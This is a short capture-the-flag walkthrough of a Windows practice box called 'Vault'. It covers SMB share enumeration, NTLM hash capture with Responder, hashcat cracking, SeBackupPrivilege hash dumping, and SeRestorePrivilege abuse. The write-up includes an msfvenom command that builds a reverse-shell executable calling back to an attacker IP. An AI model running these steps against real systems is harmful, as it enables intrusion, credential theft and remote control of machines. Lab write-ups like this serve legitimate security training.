# Vault

I start off by scanning for open ports:

<figure><img src="../../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

i add the domain in my hosts file and look for anonymous access and smb shares:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The write permission on a share is rather unusual to my knowledge in those types off boxes but i already saw it during some previous stuff so i tried using responder to catch some NTML creds:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

this is rather strange since i did not do anything, maybe something to do with the fact that i added the domain in my hosts file idk. since i won't be lucky like this every time here is a good article about abusing NTLM relay attacks:

{% embed url="https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/" %}

Or this one:

{% embed url="https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html" %}

Then i launch my hashcat:

```
hashcat -m 5600 /usr/share/wordlists/rockyou.txt.gz ntmlhash.txt
```

{% hint style="info" %}
_**added after completing the box**_: I looked at the WU to maybe discover other routes or techniques and this writeup does a very good job at explaining how to exploit writeable shares&#x20;
{% endhint %}

and i discovered the password and quickly understand why this box is rated easy:

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ok i didn't say anything i can't read proof.txt yet:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

But i quickly see that i have SeBackupPrivilege

{% embed url="https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md" %}

So i follow all the steps and manage to dump the admin hash:

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and it does not work lol:

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I looked and this account does not have winrm rights, ouch the box seems a bit trickier than expected

I thought to myselft that i jumped on SeBackupPrivilege so quickly that i did not look into the other privileges such as the restore privilege:

{% embed url="https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------" %}

After looking at how the script works we need to craft a reverse shell exe to use it as an argument:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.51 LPORT=80 -f exe -o reverse.exe
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

for some reason it did not work until i put the absolute path of reverse.exe
